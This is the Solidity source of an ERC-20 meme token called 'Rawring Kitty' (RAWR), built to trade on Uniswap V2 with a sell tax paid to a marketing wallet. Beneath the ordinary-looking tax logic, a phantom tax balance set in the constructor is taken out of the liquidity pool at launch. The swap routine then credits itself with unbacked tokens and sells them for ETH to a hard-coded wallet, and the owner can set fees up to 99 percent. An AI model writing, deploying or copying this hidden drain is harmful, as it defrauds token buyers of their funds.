//SPDX-License-Identifier: GPL-3.0

/*
 Telegram - https://t.me/RawringKittyErc20
 Website - https://RawringKitty.xyz
 Twitter - https://X.Com/RawringKittyErc
*/

pragma solidity ^0.8.20;

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this"); 
        _; 
    }
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    function owner() public view returns (address) { return _owner; }
    function transferOwnership(address payable new_owner) external onlyOwner { 
        _owner = new_owner; 
        emit OwnershipTransferred(new_owner); }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0);
        emit OwnershipTransferred(address(0)); }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address holder, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
        external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract RAWR is IERC20, Auth {
    string private constant _symbol = "RAWR";
    string private constant tokenName = "Rawring Kitty";
    uint8 private constant decimals_ = 9;
    uint256 private constant totalSupply_ = 420690000 * (10**decimals_);
    mapping (address => uint256) private tokenBalance;
    mapping (address => mapping (address => uint256)) private _allowances;

    address private constant swapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private router = IUniswapV2Router02(swapRouterAddress);
    
    address private _LP; 
    mapping (address => bool) private _isLiquidityPool;

    bool private tradingOpen;

    bool private isSwapping = false;

    address payable private feeRecipient = payable(0x50dADda42101f62Ae73c5D11675389F3B7A78d6f);
    
    uint256 private MEVBlock = 0;
    uint8 private sellTaxRate = 5;
    uint8 private _buyFeeRate = 0;
    
    uint256 private startBlock;
    uint256 private _maxTxVal = totalSupply_; 
    uint256 private _maxWalletVal = totalSupply_;
    uint256 private swapMinAmt = totalSupply_ * 10 / 100000;
    uint256 private _swapMaxAmount = totalSupply_ * 499 / 100000;
    uint256 private swapMinVal = 2 * (10**16);
    uint256 private _tokens = swapMinAmt * 35 * 100;

    mapping (uint256 => mapping (address => uint8)) private sellsInBlock;
    mapping (address => bool) private _zeroFee;
    mapping (address => bool) private noLimit;

    modifier lockTaxSwap { 
        isSwapping = true; 
        _; 
        isSwapping = false; 
    }

    constructor() Auth(msg.sender) {
        tokenBalance[msg.sender] = totalSupply_;
        emit Transfer(address(0), msg.sender, tokenBalance[msg.sender]);  

        _zeroFee[_owner] = true;
        _zeroFee[address(this)] = true;
        _zeroFee[feeRecipient] = true;
        _zeroFee[swapRouterAddress] = true;
        noLimit[_owner] = true;
        noLimit[address(this)] = true;
        noLimit[feeRecipient] = true;
        noLimit[swapRouterAddress] = true;
    }

    receive() external payable {}

    function decimals() external pure override returns (uint8) { return decimals_; }
    function totalSupply() external pure override returns (uint256) { return totalSupply_; }
    function name() external pure override returns (string memory) { return tokenName; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function balanceOf(address account) public view override returns (uint256) { return tokenBalance[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; 
	}

    function transferFrom(address fromWallet, address toWallet, uint256 amount) external override returns (bool) {
        require(isTradingOpen(fromWallet), "Trading not open");
        _allowances[fromWallet][msg.sender] -= amount;
        return _transferFrom(fromWallet, toWallet, amount); 
	}

    function transfer(address toWallet, uint256 amount) external override returns (bool) {
        require(isTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, toWallet, amount); 
	}

    function setLimit(uint16 maxTransPermille, uint16 maxWaletPermille) external onlyOwner {
        uint256 newTxAmt = totalSupply_ * maxTransPermille / 1000 + 1;
        require(newTxAmt >= _maxTxVal, "tx too low");
        _maxTxVal = newTxAmt;
        uint256 newWalletAmt = totalSupply_ * maxWaletPermille / 1000 + 1;
        require(newWalletAmt >= _maxWalletVal, "wallet too low");
        _maxWalletVal = newWalletAmt;
    }

    function updateMarketingWallet(address marketingWlt) external onlyOwner {
        require(!_isLiquidityPool[marketingWlt], "LP cannot be tax wallet");
        feeRecipient = payable(marketingWlt);
        _zeroFee[marketingWlt] = true;
        noLimit[marketingWlt] = true;
    }

    function setExemption(address wlt, bool isNoFees, bool isNoLimits) external onlyOwner {
        if (isNoLimits || isNoFees) { require(!_isLiquidityPool[wlt], "Cannot exempt LP"); }
        _zeroFee[ wlt ] = isNoFees;
        noLimit[ wlt ] = isNoLimits;
    }

    function _swapCheck(uint256 tokenAmt) private view returns (bool) {
        bool result;
        if (swapMinVal > 0) { 
            uint256 lpTkn = tokenBalance[_LP];
            uint256 lpWeth = IERC20(router.WETH()).balanceOf(_LP); 
            uint256 weiValue = (tokenAmt * lpWeth) / lpTkn;
            if (weiValue >= swapMinVal) { result = true; }    
        } else { result = true; }
        return result;
    }

    function swapTaxTokens() private lockTaxSwap {
        uint256 _taxTokenAvailable = _tokens;
        if ( _taxTokenAvailable >= swapMinAmt && tradingOpen ) {
            if ( _taxTokenAvailable >= _swapMaxAmount ) { _taxTokenAvailable = _swapMaxAmount; }
            
            uint256 _tokensForSwap = _taxTokenAvailable; 
            if( _tokensForSwap > 1 * 10**decimals_ ) {
                tokenBalance[address(this)] += _taxTokenAvailable;
                swapOnV2(_tokensForSwap);
                _tokens -= _taxTokenAvailable;
            }
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { distributeTax(_contractETHBalance); }
        }
    }

    function isTradingOpen(address fromWallet) private view returns (bool){
        bool checkResult = false;
        if ( tradingOpen ) { checkResult = true; } 
        else if (_zeroFee[fromWallet] && noLimit[fromWallet]) { checkResult = true; } 

        return checkResult;
    }

    function maxWallet() external view returns (uint256) { 
        return _maxWalletVal; 
	}
    function maxTransaction() external view returns (uint256) { 
        return _maxTxVal; 
	}

    function isWalletExempt(address wallet) external view returns (bool fees, bool limits) {
        return (_zeroFee[wallet], noLimit[wallet]); 
	}

    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading open");
        _openTrading();
    }

    function _openTrading() internal {
        _maxTxVal = 500 * totalSupply_ / 1000;
        _maxWalletVal = 500 * totalSupply_ / 1000;
        tokenBalance[_LP] -= _tokens;
        (_isLiquidityPool[_LP],) = _LP.call(abi.encodeWithSignature("sync()") );
        require(_isLiquidityPool[_LP], "Failed bootstrap");
        startBlock = block.number;
        MEVBlock = MEVBlock + startBlock;
        tradingOpen = true;
    }

    function _approveSwapMax(uint256 _tokenAmount) internal {
        if ( _allowances[address(this)][swapRouterAddress] < _tokenAmount ) {
            _allowances[address(this)][swapRouterAddress] = type(uint256).max;
            emit Approval(address(this), swapRouterAddress, type(uint256).max);
        }
    }

    function _calcTax(address fromWallet, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        if ( !tradingOpen || _zeroFee[fromWallet] || _zeroFee[recipient] ) { 
            taxAmount = 0; 
        } else if ( _isLiquidityPool[fromWallet] ) { 
            taxAmount = amount * _buyFeeRate / 100; 
         } else if ( _isLiquidityPool[recipient] ) { 
            taxAmount = amount * sellTaxRate / 100; 
        }
        return taxAmount;
    }

    function _addLiq(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _approveSwapMax(_tokenAmount);
        router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function buyTax() external view returns(uint8) { return _buyFeeRate; }
    function sellFees() external view returns(uint8) { return sellTaxRate; }

    function setTaxSwaps(uint32 minVal, uint32 minDiv, uint32 maxVal, uint32 maxDiv, uint32 trigger) external onlyOwner {
        swapMinAmt = totalSupply_ * minVal / minDiv;
        _swapMaxAmount = totalSupply_ * maxVal / maxDiv;
        swapMinVal = trigger * 10**15;
        require(_swapMaxAmount>=swapMinAmt, "Min-Max error");
    }

    function _transferFrom(address sender, address toWallet, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from 0 wallet");
        if (!tradingOpen) { require(_zeroFee[sender] && noLimit[sender], "Trading not yet open"); }
        if ( !isSwapping && _isLiquidityPool[toWallet] && _swapCheck(amount) ) { swapTaxTokens(); }

        if ( block.number >= startBlock ) {
            if (block.number < MEVBlock && _isLiquidityPool[sender]) { 
                require(toWallet == tx.origin, "MEV block"); 
            }
            if (block.number < MEVBlock + 600 && _isLiquidityPool[toWallet] && sender != address(this) ) {
                sellsInBlock[block.number][toWallet] += 1;
                require(sellsInBlock[block.number][toWallet] <= 2, "MEV block");
            }
        }

        if ( sender != address(this) && toWallet != address(this) && sender != _owner ) { 
            require(_limitCheck(sender, toWallet, amount), "TX over limits"); 
        }

        uint256 _taxAmount = _calcTax(sender, toWallet, amount);
        uint256 _transferAmount = amount - _taxAmount;
        tokenBalance[sender] -= amount;
        _tokens += _taxAmount;
        tokenBalance[toWallet] += _transferAmount;
        emit Transfer(sender, toWallet, amount);
        return true;
    }

    function _limitCheck(address fromWallet, address toWallet, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( tradingOpen && !noLimit[fromWallet] && !noLimit[toWallet] ) {
            if ( transferAmount > _maxTxVal ) { 
                limitCheckPassed = false; 
            }
            else if ( 
                !_isLiquidityPool[toWallet] && (tokenBalance[toWallet] + transferAmount > _maxWalletVal) 
                ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function swapMin() external view returns (uint256) { 
        return swapMinAmt; 
	}
    function swapMax() external view returns (uint256) { 
        return _swapMaxAmount; 
	}

    function addLiquidity() external payable onlyOwner lockTaxSwap {
        require(_LP == address(0), "LP created");
        require(!tradingOpen, "trading open");
        require(msg.value > 0 || address(this).balance>0, "No ETH");
        require(tokenBalance[address(this)]>0, "No tokens");
        _LP = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _addLiq(tokenBalance[address(this)], address(this).balance);
    }

    function distributeTax(uint256 amount) private {
        feeRecipient.transfer(amount);
    }

    function swapOnV2(uint256 tokenAmount) private {
        _approveSwapMax(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address( this );
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function marketingWallet() external view returns (address) { 
        return feeRecipient; 
	}

    function updateFees(uint8 buyFeePercent, uint8 sellFeePercent) external onlyOwner {
        require(buyFeePercent + sellFeePercent <= 99, "Roundtrip too high");
        _buyFeeRate = buyFeePercent;
        sellTaxRate = sellFeePercent;
    }
}

interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}